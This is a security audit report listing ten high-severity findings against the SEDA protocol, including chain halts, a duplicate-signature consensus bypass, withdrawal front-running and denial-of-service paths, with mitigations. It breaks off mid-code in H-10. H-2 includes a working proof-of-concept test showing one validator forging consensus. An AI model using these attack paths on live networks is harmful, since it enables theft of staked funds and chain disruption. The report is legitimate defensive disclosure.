# Issue H-1: Chain halt as VerifyVoteExtensionHandler is not guaranteed to run 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/30 

## Found by 
Boy2000, ifeco445

### Summary

Late/slow precommit votes, after +2/3 votes do not trigger VerifyVoteExtensionHandler. `ProcessProposalHandler` expects all vote extensions to be valid. Single malicious/misbehaving validator can inject invalid vote extension to the (previous) block, resulting in chain halt.

### Root Cause

1. PrepareProposal does not re-verify/ignore invalid LocalLastCommit votes

https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L177
```go
func (h *Handlers) PrepareProposalHandler() sdk.PrepareProposalHandler {
	return func(ctx sdk.Context, req *abcitypes.RequestPrepareProposal) (*abcitypes.ResponsePrepareProposal, error) {
		// Check if there is a batch whose signatures must be collected
		// at this block height.
		var collectSigs bool
		_, err := h.batchingKeeper.GetBatchForHeight(ctx, ctx.BlockHeight()+BlockOffsetCollectPhase)
		if err != nil {
			if !errors.Is(err, collections.ErrNotFound) {
				return nil, err
			}
		} else {
			collectSigs = true
		}

		var injection []byte
		if req.Height > ctx.ConsensusParams().Abci.VoteExtensionsEnableHeight && collectSigs {
			err := baseapp.ValidateVoteExtensions(ctx, h.stakingKeeper, req.Height, ctx.ChainID(), req.LocalLastCommit)
			if err != nil {
				return nil, err
			}

@>			injection, err = json.Marshal(req.LocalLastCommit)
			if err != nil {
				h.logger.Error("failed to marshal extended votes", "err", err)
				return nil, err
			}

			injectionSize := int64(len(injection))
			if injectionSize > req.MaxTxBytes {
				h.logger.Error(
					"vote extension size exceeds block size limit",
					"injection_size", injectionSize,
					"MaxTxBytes", req.MaxTxBytes,
				)
				return nil, ErrVoteExtensionInjectionTooBig
			}
			req.MaxTxBytes -= injectionSize
		}

		defaultRes, err := h.defaultPrepareProposal(ctx, req)
		if err != nil {
			h.logger.Error("failed to run default prepare proposal handler", "err", err)
			return nil, err
		}

		proposalTxs := defaultRes.Txs
		if injection != nil {
			proposalTxs = append([][]byte{injection}, proposalTxs...)
			h.logger.Debug("injected local last commit", "height", req.Height)
		}
		return &abcitypes.ResponsePrepareProposal{
			Txs: proposalTxs,
		}, nil
	}
}
```

2. ProcessProposalHandler expects all votes (batches) to be valid/verified

https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L235
```go
func (h *Handlers) ProcessProposalHandler() sdk.ProcessProposalHandler {
	return func(ctx sdk.Context, req *abcitypes.RequestProcessProposal) (*abcitypes.ResponseProcessProposal, error) {
		if req.Height <= ctx.ConsensusParams().Abci.VoteExtensionsEnableHeight {
			return h.defaultProcessProposal(ctx, req)
		}

		batch, err := h.batchingKeeper.GetBatchForHeight(ctx, ctx.BlockHeight()+BlockOffsetCollectPhase)
		if err != nil {
			if errors.Is(err, collections.ErrNotFound) {
				return h.defaultProcessProposal(ctx, req)
			}
			return nil, err
		}

		var extendedVotes abcitypes.ExtendedCommitInfo
		if err := json.Unmarshal(req.Txs[0], &extendedVotes); err != nil {
			h.logger.Error("failed to decode injected extended votes tx", "err", err)
			return nil, err
		}

		// Validate vote extensions and batch signatures.
		err = baseapp.ValidateVoteExtensions(ctx, h.stakingKeeper, req.Height, ctx.ChainID(), extendedVotes)
		if err != nil {
			return nil, err
		}

		for _, vote := range extendedVotes.Votes {
			// Only consider extensions with pre-commit votes.
			if vote.BlockIdFlag == cmttypes.BlockIDFlagCommit {
				err = h.verifyBatchSignatures(ctx, batch.BatchNumber, batch.BatchId, vote.VoteExtension, vote.Validator.Address)
				if err != nil {
@>					h.logger.Error("proposal contains an invalid vote extension", "vote", vote)
					return nil, err
				}
			}
		}

		req.Txs = req.Txs[1:]
		return h.defaultProcessProposal(ctx, req)
	}
}
```

### Internal Pre-conditions

-

### External Pre-conditions

-

### Attack Path

1. Malicious/misbehaving validator late-injects invalid vote at the right height (when there is a batch to sign, to not return early due to 0 batches). Alternatively optimistically sends invalid votes continuously.
2. The vote is not validated (with app logic) and is added to LocalLastCommit.
3. Next block proposer -> propose block with invalid vote -> ProcessProposalHandler repeatedly fails.

### Impact

Chain halt

### PoC

_No response_

### Mitigation

_No response_

# Issue H-2: Malicious validators will bypass consensus threshold requirements affecting the integrity of the SEDA protocol's cross-chain data verification system 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/62 

## Found by 
0x0x0xw3, 0xlookman, 4n0nx, Boy2000, ChaosSR, Kodyvim, PASCAL, Schnilch, Stiglitz, abdulsamijay, destiny\_rs, dod4ufn, g, newspacexyz, oxelmiguel, rsam\_eth, tallo, verbotenviking, zxriptor

### Summary

A lack of uniqueness validation in validator signature processing will cause a critical security breach for the SEDA protocol as malicious validators will artificially inflate their voting power by submitting duplicate signatures, allowing validators with minimal actual authority to unilaterally approve batches.

### Root Cause

In [seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol:114-119](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L114-L119) the contract accumulates validator voting power without checking if a validator's signature has already been counted:
```solidity
for (uint256 i = 0; i < validatorProofs.length; i++) {
    if (!_verifyValidatorProof(validatorProofs[i], s.lastValidatorsRoot)) {
        revert InvalidValidatorProof();
    }
    if (!_verifySignature(batchId, signatures[i], validatorProofs[i].signer)) {
        revert InvalidSignature();
    }
    votingPower += validatorProofs[i].votingPower;
}
```
The code fails to track which validators have already contributed to the voting power total, allowing duplicate entries.

### Internal Pre-conditions

1. A malicious validator needs to control at least one validator with any amount of voting power
2. The validator must have the ability to submit transactions to the `Secp256k1ProverV1` contract with multiple copies of their own signature and proof

### External Pre-conditions

None required - the attack can be executed independently of external systems

### Attack Path

1. Attacker identifies their validator's voting power (e.g., 0.25% of total power)
2. Attacker calculates how many duplicates are needed to reach the 66.67% consensus threshold
3. Attacker generates a valid signature for their validator for a malicious batch
4. Attacker creates arrays containing their signature and validator proof repeated the required number of times
5. Attacker calls `postBatch()` with these arrays, passing the verification checks
6. The contract approves the batch despite only having one actual validator's approval

### Impact

The SEDA protocol suffers a complete security breakdown. Validators with minimal voting power can unilaterally approve batches, completely bypassing the consensus mechanism. This allows malicious validators to:

- Post fraudulent data results
- Update the validator set with malicious entries
- Potentially steal funds from dependent contracts that trust SEDA's data
- Undermine the foundational security assumptions of the cross-chain oracle system

### PoC

```solidity
// Add test case at: `seda-evm-contracts/test/prover/Secp256k1ProverV1.test.ts`
it('proves vulnerability scales with validator power percentage', async () => {
  // Create test fixtures with different validator power distributions
  const distributions = [
    { description: "Tiny validator (0.25%)", validatorCount: 100, validatorIndex: 1 },
    { description: "Small validator (1%)", validatorCount: 25, validatorIndex: 1 },
    { description: "Medium validator (5%)", validatorCount: 10, validatorIndex: 2 },
    { description: "Larger validator (10%)", validatorCount: 9, validatorIndex: 1 }
  ];
  
  for (const dist of distributions) {
    console.log(`\nTesting: ${dist.description}`);
    
    // Deploy with specific validator count
    const { prover: customProver, data: customData } = await deployWithSize({ validators: dist.validatorCount });
    const customWallets = customData.wallets;
    
    // Get validator power and calculate percentage
    const validatorPower = customData.validatorProofs[dist.validatorIndex].votingPower;
    const totalPower = 100000000; // Default total
    const powerPercentage = (validatorPower / totalPower) * 100;
    console.log(`Validator has ${validatorPower} voting power (${powerPercentage.toFixed(2)}% of total)`);
    
    // Create batch and sign with this validator
    const { newBatchId, newBatch } = generateNewBatchWithId(customData.initialBatch);
    const signature = await customWallets[dist.validatorIndex].signingKey.sign(newBatchId).serialized;
    
    // Verify single signature doesn't reach consensus
    try {
      await customProver.postBatch(newBatch, [signature], [customData.validatorProofs[dist.validatorIndex]]);
      console.log("ERROR: Single signature was enough - test invalid");
    } catch (e) {
      // Calculate required duplicates
      const consensusThreshold = 66_670_000; // 66.67%
      const duplicatesNeeded = Math.ceil(consensusThreshold / validatorPower);
      console.log(`Need ${duplicatesNeeded} duplicates to reach consensus threshold`);
      
      // Prepare duplicated arrays
      const signatures = Array(duplicatesNeeded).fill(signature);
      const duplicatedProofs = Array(duplicatesNeeded).fill(customData.validatorProofs[dist.validatorIndex]);
      
      const [batchSender] = await ethers.getSigners();
      
      // Demonstrate exploit
      await expect(customProver.postBatch(newBatch, signatures, duplicatedProofs))
        .to.emit(customProver, 'BatchPosted')
        .withArgs(newBatch.batchHeight, newBatchId, batchSender.address);
      
      // Verify success
      const lastBatchHeight = await customProver.getLastBatchHeight();
      expect(lastBatchHeight).to.equal(newBatch.batchHeight);
      
      console.log(`EXPLOIT SUCCESSFUL: ${powerPercentage.toFixed(2)}% validator can update batches with ${duplicatesNeeded} duplicates`);
    }
  }
});
```

The results demonstrate how validators with any amount of power can exploit the vulnerability:

Validator Power | Duplicates Required | Notes
-- | -- | --
0.25% | 267 | Even tiny validators can exploit the vulnerability
1% | 67 | Small validators need moderate duplication
5% | 14 | Medium validators need minimal duplication
10% | 7 | Larger validators need very few duplicates

The lower the validator's power, the more duplicates are needed, but all validators can eventually reach the threshold.

Command to run test:
```bash
npx hardhat test test/prover/Secp256k1ProverV1.test.ts --grep "proves vulnerability scales with validator power percentage"
```

Result example:
```bash

  Secp256k1ProverV1

Testing: Tiny validator (0.25%)
Validator has 252525 voting power (0.25% of total)
Need 265 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 0.25% validator can update batches with 265 duplicates

Testing: Small validator (1%)
Validator has 1041666 voting power (1.04% of total)
Need 65 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 1.04% validator can update batches with 65 duplicates

Testing: Medium validator (5%)
Validator has 2777777 voting power (2.78% of total)
Need 25 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 2.78% validator can update batches with 25 duplicates

Testing: Larger validator (10%)
Validator has 3125000 voting power (3.13% of total)
Need 22 duplicates to reach consensus threshold
EXPLOIT SUCCESSFUL: 3.13% validator can update batches with 22 duplicates
    ✔ proves vulnerability scales with validator power percentage (1559ms)


  1 passing (2s)
```

### Mitigation

Add uniqueness tracking to prevent counting the same validator more than once:

```solidity
function postBatch(
    SedaDataTypes.Batch calldata newBatch,
    bytes[] calldata signatures,
    SedaDataTypes.ValidatorProof[] calldata validatorProofs
) external override(ProverBase) whenNotPaused {
    // ... existing code ...
    
    uint64 votingPower = 0;
    mapping(address => bool) memory seenValidators;
    
    for (uint256 i = 0; i < validatorProofs.length; i++) {
        address signer = validatorProofs[i].signer;
        
        // Prevent duplicate validators
        if (seenValidators[signer]) {
            revert DuplicateValidator(signer);
        }
        seenValidators[signer] = true;
        
        // ... existing verification code ...
        
        votingPower += validatorProofs[i].votingPower;
    }
    
    // ... rest of function ...
}
```

This fix ensures each validator is only counted once when calculating the total voting power, preserving the integrity of the consensus mechanism.

# Issue H-3: ExecuteTallyVM has a memory leak which will lead to nodes eventually crashing 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/182 

## Found by 
Boy2000, g, gxh191, tallo, zxriptor

### Summary

The continuous memory allocation without freeing in `execute.go` will cause a memory leak for node operators as each block will lose a small amount of memory, eventually depleting the node's resources over extended operation periods.


### Root Cause


In `execute.go` the `configDirC` C string is allocated with `C.CString(LogDir)` but never freed with `C.free(unsafe.Pointer(configDirC))`, unlike all other C string allocations in the same function.

https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-wasm-vm/tallyvm/execute.go#L27

### Internal Pre-conditions

1. The SEDA node is running and processing blocks
2. The `ExecuteTallyVm` function is called from the `EndBlock` function
3. The `LogDir` global variable is set to a non-empty string path

### External Pre-conditions

None

### Attack Path

1. The Tally module's `EndBlock` function is called automatically at the end of each block
2. This calls `ProcessTallies` which processes data requests ready for tallying
3. For each tally operation, the `FilterAndTally` method is invoked
4. This ultimately executes the `ExecuteTallyVm` function in `execute.go`
5. Each execution allocates memory for `configDirC` without freeing it
6. The allocated memory accumulates over time as each block is processed
7. Eventually, after running for an extended period, the node will run out of memory

### Impact

The SEDA node operators suffer a continuous memory leak that will eventually lead to degraded performance and potential node crashes. The amount of memory leaked per block is equal to the length of the `LogDir` string plus 1 byte (for the null terminator).
For a typical path length of ~30 bytes, `/home/seda/.seda/tally-logs\00`, a default MaxTalliesPerBlock of 100, and an average of 20 data requests per block, this will add up to ~3gb of allocated memory that is leaked each year. Longer paths, more data requests per block will result in a faster leakage and result in an eventual crash for all systems. Systems with lower specs will crash sooner rather than later

### Mitigation

just like with all the other C.Cstring initializations in the function, add the line:
```go
defer C.free(unsafe.Pointer(configDirC)
```

# Issue H-4: Malicious WASM program can cause denial of service attack against SEDA validators through unbounded stdout/stderr 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/206 

## Found by 
tallo

### Summary

The absence of size limits on WASM stdout/stderr outputs will cause a denial of service vulnerability for SEDA validators as attackers can exhaust node memory by creating data requests with WASM modules that generate excessive terminal output.


### Root Cause

In `runtime.rs` there is no size limit enforcement for stdout/stderr buffers, unlike the explicit limit that exists for VM execution results:
```rust
// Add size check for execution result
if execution_result.len() > MAX_VM_RESULT_SIZE_BYTES {
    stderr.push(format!(
        "Result size ({} bytes) exceeds maximum allowed size ({} bytes)",
        execution_result.len(),
        MAX_VM_RESULT_SIZE_BYTES
    ));
    return Err(VmResultStatus::ResultSizeExceeded);
}
```

### Internal Pre-conditions

1. Attacker needs to submit a data request with a custom WASM program that writes excessive amounts of data to stdout/stderr

### External Pre-conditions

None

### Attack Path

1. Attacker creates a malicious WASM module that repeatedly writes large chunks of data to stdout and stderr, potentially using a loop to generate several gigabytes of output
2. Attacker submits this module as part of a legitimate data request to the SEDA network with sufficient gas limit
3. When validators process this request during the tally phase in endblock.go, the WASM module executes and generates excessive stdout/stderr output
4. These outputs are collected without size limits and passed through multiple layers of memory allocation and copying
5. The outputs are then included in blockchain events, and written to consuming substantial memory and processing resources
6. Validator nodes experience memory exhaustion, potentially causing crashes and significant performance degradation

### Impact

To cause the most impact a malicious user can submit multiple data requests to the same malicious program, these can all be processed in the same batch. Each stdout/stderr will be stored in memory:
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L80
```go
tallyResults := make([]TallyResult, len(tallyList))
dataResults := make([]batchingtypes.DataResult, len(tallyList))

for i, req := range tallyList {
    // [...]
    _, tallyResults[i] = k.FilterAndTally(ctx, req, params, gasMeter)
    // [...]
}
```
And allows for a max of u32 (4gb) according to the wasmer fd_write syscall:
https://github.com/wasmerio/wasmer/blob/475f335cb5a84ef6a8179699d322ca776c1bd26b/lib/wasix/src/syscalls/wasi/fd_write.rs#L11C1-L32C32
```rust
/// ### `fd_write()`
/// Write data to the file descriptor
/// Inputs:
/// - `Fd`
///     File descriptor (opened with writing) to write to
/// - `const __wasi_ciovec_t *iovs`
///     List of vectors to read data from
/// - `u32 iovs_len`
///     Length of data in `iovs`
/// Output:
/// - `u32 *nwritten`
///     Number of bytes written
/// Errors:
///
#[instrument(level = "trace", skip_all, fields(%fd, nwritten = field::Empty), ret)]
pub fn fd_write<M: MemorySize>(
    mut ctx: FunctionEnvMut<'_, WasiEnv>,
    fd: WasiFd,
    iovs: WasmPtr<__wasi_ciovec_t<M>, M>,
    iovs_len: M::Offset,
    nwritten: WasmPtr<M::Offset, M>,
) -> Result<Errno, WasiError> {
```
meaning a single data request with stderr/stdout of 8gb total will be copied across rust strings, converted to Vec<string>, serialized to C-compatible FFI structures, copied to Go data structures via CGO, formatted and joined for event attributes all while being stored in tallyResults. Since this is all executed in Endblocker, and multiple malicious data requests can be submitted, all validators will face extremely degraded performance and OOM crashes

### Mitigation

Implement size limits for stdout and stderr similar to those already in place for execution results

# Issue H-5: Attacker can exploits batch sender role to block result Submissions via fee transfer reversion 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/208 

## Found by 
Schnilch, newspacexyz, rsam\_eth, zxriptor

### Summary
The `postBatch` function can be called by any address if all parameters are valid—that is, if the batch includes valid signatures from validators present in `s.lastValidatorsRoot` and the batch itself is valid. The address that submits the batch becomes its sender and is entitled to receive the `batchFee` rewards from all results corresponding to that batch. However, if the batch sender is a contract that reverts when receiving native tokens, then the results for that batch cannot be posted.

### Root Cause
The `postBatch` function allows any address to submit a batch as long as the following conditions are met:

**1. Batch Height is Greater Than the Previous One**
```solidity
            if (newBatch.batchHeight <= s.lastBatchHeight) {
                revert InvalidBatchHeight();
            }
```
which is true for upcoming batch

**2. Validators in the validatorProofs Are Part of the Latest lastValidatorsRoot**
```solidity
            if (!_verifyValidatorProof(validatorProofs[i], s.lastValidatorsRoot)) {
                revert InvalidValidatorProof();
            }
```
This validation confirms that each validator who signed the batch is included in the most recent validators root.

**3- signatures for `batchId` are valid and belong to the validators:**
```solidity
            if (!_verifySignature(batchId, signatures[i], validatorProofs[i].signer)) {
                revert InvalidSignature();
            }
```

**4- voting power percentage exceeds the `CONSENSUS_PERCENTAGE`:**
```solidity
        if (votingPower < CONSENSUS_PERCENTAGE) {
            revert ConsensusNotReached();
        }
```
This check ensures that the cumulative voting power of the validators who signed the batch exceeds the consensus threshold (typically 66.6%).

Once these validations pass, the state is updated to assign the batch sender to msg.sender:
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/provers/Secp256k1ProverV1.sol#L131
```solidity
s.batches[newBatch.batchHeight] = BatchData({resultsRoot: newBatch.resultsRoot, sender: msg.sender});
```

When `postResult` is later called, after verifying that the result ID is included in the batch’s `resultsRoot`, the `batchFee` is sent to the `batchSender`:
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L181-L190
```solidity
        if (requestDetails.batchFee > 0) {
            if (batchSender == address(0)) {
                // If no batch sender, send all batch fee to requestor
                refundAmount += requestDetails.batchFee;
            } else {
                // Send batch fee to batch sender
                //@audit batchSender does not accept ether
                _transferFee(batchSender, requestDetails.batchFee);
                emit FeeDistributed(result.drId, batchSender, requestDetails.batchFee, ISedaCore.FeeType.BATCH);
            }
        }
```
If the batchSender is a contract that does not accept native tokens, the fee transfer (and `postResult`) will fail:
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L356-L360
```solidity
    function _transferFee(address recipient, uint256 amount) internal {
        // Using low-level call instead of transfer()
        (bool success, ) = payable(recipient).call{value: amount}("");
        if (!success) revert FeeTransferFailed();
    }
```

### Internal Pre-conditions
- The contract must not be in a paused state.
- Batch.resultsRoot must not be bytes32(0), meaning it must contain valid results.

### External Pre-conditions
- The `postBatch` transaction is processed through a public mempool.
- The sender of `postBatch` is a contract that does not accept ether in its receive function.

### Attack Path
- A very popular DeFi platform relies on the SEDA chain to fetch critical, time-sensitive data and submits 10 requests to the SedaCoreV1 contract.
- A solver submits a `postBatch` transaction containing a `resultsRoot` that covers the results for these 10 requests, along with results for other requests.
- An attacker deploys a contract that reverts when it receives native tokens.
- The attacker front-runs the solver's transaction by offering a much higher gas fee.
- The attacker's transaction is processed, causing the malicious contract to become the batch sender.
- When `postResult` is called, it reverts because the batch sender contract does not accept native ens

### Impact
- Results for the batch cannot be posted.
- The attack is almost cost-free for the attacker (aside from a negligible gas fee on L2s). An attacker can repeatedly become the batch sender for all batches and block all `postResult` requests.

### PoC

_No response_

### Mitigation
Ensure that batch sender is a valid solver:
```solidity
    function postBatch(
        SedaDataTypes.Batch calldata newBatch,
        bytes[] calldata signatures,
        SedaDataTypes.ValidatorProof[] calldata validatorProofs
    ) external override(ProverBase) whenNotPaused {
      if(!validSubmitter[msg.sender]) revert InvalidBatchSender();
```

# Issue H-6: Attacker can front-run Withdraw and steal the withdrawal 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/231 

## Found by 
000000, 0xeix, Boy2000, DeLaSoul, cu5t0mPe0, dod4ufn, g, leopoldflint, zxriptor

### Summary

The Withdraw message in the Seda Core contract [sends](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain-contracts/contract/src/msgs/staking/execute/withdraw.rs#L36-L39) the withdrawn tokens to the message sender. This enables anyone to front-run the withdrawal with the same message to steal the withdrawn amount.

### Root Cause

- The withdrawn tokens are [sent](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain-contracts/contract/src/msgs/staking/execute/withdraw.rs#L36-L39) to the message sender.
```rust
  let bank_msg = BankMsg::Send {
      to_address: info.sender.to_string(),
      amount:     coins(self.amount.u128(), token),
  };
```
- No [checks](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain-contracts/contract/src/msgs/staking/execute/withdraw.rs#L8-L33) are done on the message sender, so it can be anyone.


### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. Attacker observes a Withdraw message with valid proof.
2. Attacker frontruns the Withdraw copying the same message to steal the withdrawn amount.

### Impact

Permanent loss of funds for the Staker.

### PoC

_No response_

### Mitigation

Consider sending the withdrawn tokens to a pre-approved address instead of the `info.sender`.

# Issue H-7: A jailed validator with no registered key blocks proving scheme activation 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/239 

## Found by 
g, zxriptor

### Summary

When a proving scheme is ready for activation, all validators without registered keys will be jailed. However, there is no check
that a validator is currently jailed before jailing, which raises an error and causes the `EndBlock()` to return early without
activating the proving scheme. 

### Root Cause

- In Pubkey module's `EndBlock()`, a validator without keys will get [jailed](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/pubkey/keeper/endblock.go#L135-L144) without first checking if it is already jailed.
- `slashingKeeper.Jail()` eventually calls [`jailValidator()`](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/x/staking/keeper/val_state_change.go#L309-L311), which returns an error when a validator is already jailed.
```golang
if validator.Jailed {
  return types.ErrValidatorJailed.Wrapf("cannot jail already jailed validator, validator: %v", validator)
}
```

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. A validator has no registered keys. It is [optional](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/staking/keeper/msg_server.go#L65-L76) to register keys while the scheme is not activated.
2. This validator with no keys gets permanently Jailed for double-signing.
3. The Pubkey module's `EndBlock()` always [returns early](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/pubkey/keeper/endblock.go#L40-L43), because `JailValidators()` always fails.


### Impact

The Proving Scheme will not be activated at the configured activation height and will remain inactive while the validator is jailed
and has no registered key. A validator can be jailed permanently, leading to the Proving Scheme never getting activated.

A validator can prevent [batches](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/batching/keeper/endblock.go#L36-L42) from ever getting produced because the SEDAKeyIndexSecp256k1 proving scheme never gets activated.


### PoC
None


### Mitigation
Consider checking first if the Validator is Jailed before jailing it.

# Issue H-8: Malicious proposer can submit a request with large invalid transactions because of no mempool to bloat the block store 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/241 

## Found by 
Boy2000, bronze\_pickaxe, g

### Summary

Context:
- Raw transaction bytes of every transaction included in a proposed block will be stored by CometBFT in its Blockstore
- There is no BlockStore pruning done by SEDA Chain

The SEDA Chain's proposal handlers are configured with a [no-op mempool](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/app.go#L1012). This default ProcessProposal handler
is [called](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L273) after the vote extensions have been verified. Since 
the handler is configured with a no-op mempool, [no additional processing](https://github.com/cosmos/cosmos-sdk/blob/main/baseapp/abci_utils.go#L421-L427) is done and the transactions are accepted with verification.

Given the above, a malicious proposer can abuse the lack of transaction validation and fill every block they propose with invalid
transactions up to the MaxBlockSize (a consensus parameter set in CometBFT). 

### Root Cause

In [`app.go:1012`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/app.go#L1012), the default proposal handlers are configured to use the `NoOpMempool`. However, it is not advisable to use that in production because
of the lack of transaction verification.

```golang
defaultProposalHandler := baseapp.NewDefaultProposalHandler(mempool.NoOpMempool{}, bApp)
```

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path

1. A proposer proposes a block with a valid first transaction and the rest of the block filled with invalid transactions up to the MaxBlockSize.
2. This block with mostly invalid transactions will be accepted by every validator even if all the other transactions fail. The raw transaction bytes of all the transactions will be recorded in the BlockStore.


### Impact

Permanent storage of invalid transactions that would bloat the chain unnecessarily and consume more resources during:
- Block propagation (network bandwidth)
- Block processing (CPU/memory)
- Block storage (disk space)
- Future node synchronization

### PoC
None


### Mitigation
Consider replacing `NoOpMempool` with a valid mempool when configuring the proposal handlers.

# Issue H-9: Tallying a Data Request with a wildcard expression in its consensus filter will store non-deterministic data and cause a chain halt 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/245 

## Found by 
g

### Summary

In Tally module's `EndBlock()`, all tallying Data Requests will be [processed](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L40). Each Data Request can have a [Consensus Filter](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L200), which will be [applied](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L77) to every reveal object in the Data Request. 

When the filter type is [`FilterStdDev`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/types/filters.go#L190-L193) or [`FilterMode`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/types/filters.go#L80-L93), the consensus filter will be applied. The filter is treated as a path expression for querying data from a JSON object. One of the supported path expressions is the wildcard expression, which gets all the elements in the JSON object, but the results have a non-deterministic order. Due to this non-deterministic order, validators will [get different](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/types/filters_util.go#L58-L61) `dataList`, `freq`, and `maxFreq`. This leads to a state divergence that will cause consensus failures, and ultimately, a chain halt.

### Root Cause

In [`filters_util.go:36-51`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/types/filters_util.go#L36-L51), any path expression is accepted and it expects that the results
will have a deterministic ordering. Only the 0th-index of `elems` is accessed.

```golang
    obj, err := parser.Parse(revealBytes)
    if err != nil {
      errors[i] = true
      continue
    }
    expr, err := jp.ParseString(dataPath)
    if err != nil {
      errors[i] = true
      continue
    }
    // @audit the path exression is applied here to query elements from the reveal JSON object
    elems := expr.GetNodes(obj)
    if len(elems) < 1 {
      errors[i] = true
      continue
    }
    // @audit only the first element is returned as data
    data := elems[0].String()
```

Below is an example of a wildcard expression used to query a JSON object.

```pseudocode
JSON: {"a": 1, "b": 2, "c": 3}
Expression: "$.*"
Results could be: [1,2,3] or [2,1,3] or [3,1,2] etc.
```

The [results](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L77) of applying the filter will be in the form of `outliers` and `consensus`, which are a `[]bool` and `bool`. 

```golang
outliers, consensus := filter.ApplyFilter(reveals, res.Errors)
```

`outliers` and `consensus` can be different values for different validators. These values affect the output data results, which
will be [stored](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L109-L141).

```golang
    _, tallyResults[i] = k.FilterAndTally(ctx, req, params, gasMeter)
    // @audit the Result, ExitCode, and Consensus can be different across validators because of the non-deterministic
    // results of applying the filter
    dataResults[i].Result = tallyResults[i].Result
    dataResults[i].ExitCode = tallyResults[i].ExitCode
    dataResults[i].Consensus = tallyResults[i].Consensus
    // ... snip ...
  }

  processedReqs[req.ID] = k.DistributionsFromGasMeter(ctx, req.ID, req.Height, gasMeter, params.BurnRatio)

  dataResults[i].GasUsed = gasMeter.TotalGasUsed()
  dataResults[i].Id, err = dataResults[i].TryHash()
  // ... snip ...

// Store the data results for batching.
for i := range dataResults {
  // @audit the data results are stored, but since the data will be different across validators, there will be
  // state divergence.
  err := k.batchingKeeper.SetDataResultForBatching(ctx, dataResults[i])
```

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path

A malicious user can abuse this.
1. A malicious user can post multiple valid Data Requests with a wildcard expression `$.*` as consensus filter.
2. Once the valid Data Requests are in "Tallying Status", the Tally module will process them and store their corresponding
Data Results for batching. Every validator here will store different values for their data results.
3. There will be a Chain Halt because there will be no consensus on the state root across validators.


### Impact

Chain halt due to state divergence across validators.

### PoC
None


### Mitigation
Consider always sorting the [result](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/types/filters_util.go#L46) of `expr.GetNodes(obj)` before getting the first element as the result.

# Issue H-10: Attackers can flood validators with Commit/Reveal execution messages to delay blocks or DOS the node 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/246 

## Found by 
g, tallo

### Summary

Commit and Reveal execution messages sent to the SEDA Core Contract are [not charged](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/ante.go#L55-L71) any gas fees. This provides a way for malicious actors
to DOS nodes or at the least delay blocks.

### Root Cause

Before a transaction is executed, the AnteHandler is run. It checks if all of the transactions' messages is [eligible for free gas](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/ante.go#L62-L67) and sets
[gas price to 0](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/ante.go#L70) when they are. 

A message is [eligible](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/ante.go#L108-L122) for free gas when it is a `CommitDataResult` or a `RevealDataResult`, and the
executor can commit or reveal.

```golang
  switch contractMsg := contractMsg.(type) {
  case CommitDataResult:
    result, err := d.queryContract(ctx, coreContract, CanExecutorCommitQuery{CanExecutorCommit: contractMsg})
    if err != nil {
